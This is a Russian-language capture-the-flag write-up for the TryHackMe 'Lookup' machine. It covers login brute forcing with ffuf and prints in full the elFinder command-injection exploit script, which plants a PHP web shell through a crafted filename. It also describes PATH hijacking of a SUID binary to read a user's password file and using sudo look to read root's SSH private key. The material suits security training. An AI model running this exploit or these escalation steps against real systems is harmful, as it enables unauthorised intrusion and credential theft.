### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
- умение работать с эксплойтами(в частности elfinder)
- брутфорс через ffuf
- чтение псевдокода на си
- эксплуатация look
### ВЗЯТИЕ ШЕЛЛА
по классике сначала сканим порты, ничего интересного - открыты 22 и 80, без всяких фичей. переходим на сайт и видим поле логина (решила сразу пофаззить и проsql'мапить, но ничего интересного не нашла). быстро решила повводить разные возможные логины (пока даже без брутфорса) и, ого, на admin'e выдает ```wrong password``` вместо стандартного ```wrong username or password```. следовательно, попробуем пофаззить пароли (в запросе из бурпа заменила value password на FUZZ)

```ffuf -request req.txt -request-proto http -w rockyou.txt -fs фильтр_по_длине_ответа```

на одном из паролей ответ отличается, но вход не осуществляется. скорее всего потому что пароль правильный, но от другого аккаунта. попробуем аналогично пофаззить юзернеймы. бинго! теперь мы можем зайти в систему под именем jose (нас перекидывает на домен files.lookup.thm, добавляем его в /etc/hosts, чтобы зайти). в файлах ничего полезного особо не нашла, так что чекнула сервис

<img width="489" height="115" alt="image" src="https://github.com/user-attachments/assets/35fd6ce0-7cae-47ac-a914-67a9f6afb517" />

и да, на эту версию есть эксплойт! заходим в msfconsole, выбираем нужный экслойт и заполняем все необходимое через options
```
Name       Current Setting  Required  Description   
----       ---------------  --------  -----------   
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...].   
                                      Supported proxies: socks5, socks5h, sapni, http, socks4   
RHOSTS     ip               yes       The target host(s), see https://docs.metasploit.com/docs/using   
                                      -metasploit/basics/using-metasploit.html   
RPORT      80               yes       The target port (TCP)   
SSL        false            no        Negotiate SSL/TLS for outgoing connections   
TARGETURI  /elFinder/       yes       The base path to elFinder   
VHOST      files.lookup.thm no        HTTP server virtual host
```
анализ эксплойта
```
import requests
import json
import sys

payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'

def usage():
    if len(sys.argv) != 2:
        print "Usage: python exploit.py [URL]"
        sys.exit(0)

def upload(url, payload):
    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}
    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}
    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)
    j = json.loads(r.text)
    return j['added'][0]['hash']

def imgRotate(url, hash):
    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
    return r.text
def shell(url):
    r = requests.get("%s/php/SecSignal.php" % url)
    if r.status_code == 200:
       print "[+] Pwned! :)"
       print "[+] Getting the shell..."
       while 1:
           try:
               input = raw_input("$ ")
               r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))
               print r.text
           except KeyboardInterrupt:
               sys.exit("\nBye kaker!")
    else:
        print "[*] The site seems not to be vulnerable :("

def main():
    usage()
    url = sys.argv[1]
    print "[*] Uploading the malicious image..."
    hash = upload(url, payload)
    print "[*] Running the payload..."
    imgRotate(url, hash)
    shell(url)

if __name__ == "__main__":
    main()
```

1.
```
payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'
```

имя файла специально сформировано так, чтобы ос выполнила команды после точки с запятой (;), SecSignal.jpg; — "легальное" имя файла.
echo 3c3f... | xxd -r -p > SecSignal.php; - берется длинная строка в шестнадцатеричном формате (Hex), декодируется обратно в текст и сохраняется в файл SecSignal.php. если декодировать 3c3f706870..., получится: ```<?php system($_GET["c"]); ?>.``` (берет команду из GET-запроса c и исполняет её на сервере)
echo SecSignal.jpg — завершающая команда, чтобы скрипт обработки изображений не выдал ошибку
2. функция upload 
скрипт отправляет POST-запрос к файлу connector.minimal.php (стандартный бэкенд elFinder). в качестве имени файла отправляется наш payload. сервер сохраняет файл, но из-за уязвимости не очищает имя. функция возвращает hash — внутренний идентификатор файла в системе elFinder.

3. Функция imgRotate (триггер)
```r = requests.get("...mode=rotate&cmd=resize...")```
скрипт просит elFinder повернуть (rotate) загруженное «изображение». внутри elFinder для поворота изображений может использоваться системная утилита (например, ImageMagick или GD) и при вызове этой утилиты elFinder подставляет имя файла в командную строку. так как имя файла содержит ;, оболочка (shell) сервера воспринимает всё, что идет после ;, как отдельные команды и исполняет их. в этот момент и создается файл SecSignal.php.

5. Функция shell (Интерактивный доступ)
После того как команда сработала и файл-шелл создан, скрипт проверяет его наличие: он обращается к .../php/SecSignal.php. если сервер отвечает кодом 200 (OK), значит, шелл успешно записан. запускается цикл while 1, где можно вводить команды в консоль, а скрипт отправляет их серверу через параметр ?c=...

готово, ловим реверсшелл!

### Взятие юзера
и вот мы очутились в терминале за пользователя www-data. подгружаем линпис, видим вот это

```
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
```
качаем к себе и читаем через ghidra, видим вот это
```
undefined8 main(void)
{
  int iVar1;
  FILE *pFVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  undefined1 local_128 [64];
  char local_e8 [112];
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("[!] Running \'id\' command to extract the username and user ID (UID)");
  snprintf(local_e8,100,"id");
  pFVar2 = popen(local_e8,"r");
  if (pFVar2 == (FILE *)0x0) {
    perror("[-] Error executing id command\n");
    uVar3 = 1;
  }
  else {
    iVar1 = __isoc99_fscanf(pFVar2,"uid=%*u(%[^)])",local_128);
    if (iVar1 == 1) {
      printf("[!] ID: %s\n",local_128);
      pclose(pFVar2);
      snprintf(local_78,100,"/home/%s/.passwords",local_128);
      pFVar2 = fopen(local_78,"r");
      if (pFVar2 == (FILE *)0x0) {
        printf("[-] File /home/%s/.passwords not found\n",local_128);
        uVar3 = 0;
      }
      else {
        while( true ) {
          iVar1 = fgetc(pFVar2);
          if ((char)iVar1 == -1) break;
          putchar((int)(char)iVar1);
        }
        fclose(pFVar2);
        uVar3 = 0;
      }
    }
    else {
      perror("[-] Error reading username from id command\n");
      uVar3 = 1;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
```
из этого можно понять что команда читает файл .passwords из домашней директории (такой файл есть у think!), и пользователь извлекается командой id с относительным путем. если мы можем добавить путь в PATH и если у нас не стоит env_reset, то может прокатить(можно проверить через ```sudo -V```). создаем файл id в tmp и добавляем нужный путь
```
www-data@ip-10-49-165-120:/tmp$ echo '#!/bin/bash' > id
echo '#!/bin/bash' > id
www-data@ip-10-49-165-120:/tmp$ echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
echo 'echo "uid=1000(think)"' >> id
www-data@ip-10-49-165-120:/tmp$ cat id
cat id
#!/bin/bash
echo "uid=1000(think)"
www-data@ip-10-49-165-120:/tmp$ PATH=/tmp/:$PATH
```
запускаем бинарник ```./pwm``` и ловим пароль от think!

### Взятие рута

по команде ```sudo -l``` видим, что нам теперь можно исполнять команду ```look``` с правами рута. попробуем прочитать с ее помощью файл с приватным ключом ssh - ```sudo /usr/bin/look '' /root/.ssh/id_rsa```. сохраняем его к себе, убираем лишние права у файла, чтобы ssh не ругался, и подрубаемся 

```ssh -i rsa_id root@ip```
